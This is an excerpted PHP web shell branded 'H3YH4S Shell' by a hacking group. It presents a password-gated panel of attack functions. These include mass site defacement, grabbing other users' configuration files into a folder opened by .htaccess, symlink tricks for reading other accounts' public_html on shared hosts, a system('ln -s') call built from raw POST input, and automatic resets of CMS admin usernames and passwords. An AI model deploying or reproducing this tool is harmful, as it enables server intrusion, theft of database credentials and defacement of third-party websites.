...
/* Configurasi */
$aupas 			= "4f58b9c8f953b2a124d6af21eb097182";// H3YH4X
...
<html>
	<head>
		...
		<meta name="copyright" content="{ H3YH4X }"/>
		<title>{ H3YH4S Shell }</title>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://facebook.com/IndoSecOfficial" class="text-muted fixed-bottom mb-3">Recode by { H3YH4X }</a>
	</body>
</html>
<?php
exit;
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">{ H3YH4X }</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">{ H3YH4X } Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2019 { H3YH4X }</small>
		</div>
	</div><br/>';
	exit;
}
...
function aksiMasdef($dir,$file,$imgfol,$imgfile){
	...
	if($_POST['start']){
		...
		echo "<form method='post'>
			...
			<textarea name='script' class='form-control' rows='13' placeholder='[Ex] Hacked By { H3YH4X }'></textarea><br/>
...
function aksiConfig($dir,$file){
	if($_POST){
		$passwd = $_POST['passwd'];
		mkdir("H3YH4X_config", 0777);
		$isi_htc = "Options allnRequire NonenSatisfy Any";
		$htc = fopen("H3YH4X_config/.htaccess","w");
		fwrite($htc, $isi_htc);
			...
			if(is_readable($user_config_dir)){
				...
				foreach($grab_config as $config => $nama_config){
					...
					if($ambil_config == ''){
						...
						$file_config = fopen("H3YH4X_config/$user_con-$nama_config.txt","w");
		...
		<a href='?dir=$dir/H3YH4X_config' class='btn btn-success btn-block mb-4'>Click Here</a>";
	}else{
		echo "<form method='post'>
				...
				if(eregi("zone",$d0main)){
					...
					if(strlen(trim($domains[1][0])) > 2){
						...
						echo "<tr>
							...
							<td>".$user['name']."</td>
							<td><a href='$full/H3YH4X_sym/root/home/".$user['name']."/public_html' target='_blank'>Symlink</a></td>
						</tr>";
						flush();
						$dcount++;
					}
			...
			<table class='text-center table-responsive'>
				...
				while(!feof($file)){
					...
					echo "<tr>
						<td>".$dcount."</td>
						<td>".$matches."</td>
						<td><a href=$full/H3YH4X_sym/root/home/".$matches."/public_html target='_blank'>Symlink</a></td>
					</tr>";
					$dcount++;
				}
				fclose($file);
...
function aksiSymread($dir,$file){
	...
	<textarea class='form-control' rows='13' name='file'>";
		...
		if ($r3ad){
			...
			if ($sm){
				$r3ad = @fopen('H3YH4X_sym/sym.txt', 'r');
				$content = @fread($r3ad, @filesize($file));
				echo "".htmlentities($content)."";
			}
		}
...
function sym404($dir,$file){
	...
	if($_POST['execute']){
		@rmdir("H3YH4X_sym404");
		@mkdir("H3YH4X_sym404", 0777);
		$dir = $_POST['dir'];
		$isi = $_POST['isi'];
		@system("ln -s ".$dir."H3YH4X_sym404/".$isi);
		@symlink($dir,"H3YH4X_sym404/".$isi);
		$inija = fopen("H3YH4X_sym404/.htaccess", "w");
		@fwrite($inija,"ReadmeName ".$isi."\nOptions Indexes FollowSymLinks\nDirectoryIndex ids.html\nAddType text/plain php html php5 phtml\nAddHandler text/plain php html php5 phtml\nSatisfy Any");
		echo'<a href="/H3YH4X_sym404/" target="_blank" class="btn btn-success btn-block mb-3">Click Me!!</a>';
	}else{
...
function autoEdit($dir,$file){
	if($_POST['hajar']){
		...
		<form method='post'>
			...
			<h5>Set User & Pass :</h5>
			<input type='text' name='user_baru' value='H3YH4X' class='form-control mb-3' placeholder='Set Username'>
			<input type='text' name='pass_baru' value='H3YH4X' class='form-control mb-4' placeholder='Set Password'>
...
<html>
	...
	<body class="bg-dark text-light">
		...
		echo '<div class="container">
			<h1 class="text-center"><a href="https://facebook.com/IndoSecOfficial" style="color:#ffffff;">{ H3YH4X }</h1>
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://facebook.com/IndoSecOfficial">Copyright 2019 { H3YH4X }</a></center><br/>';	
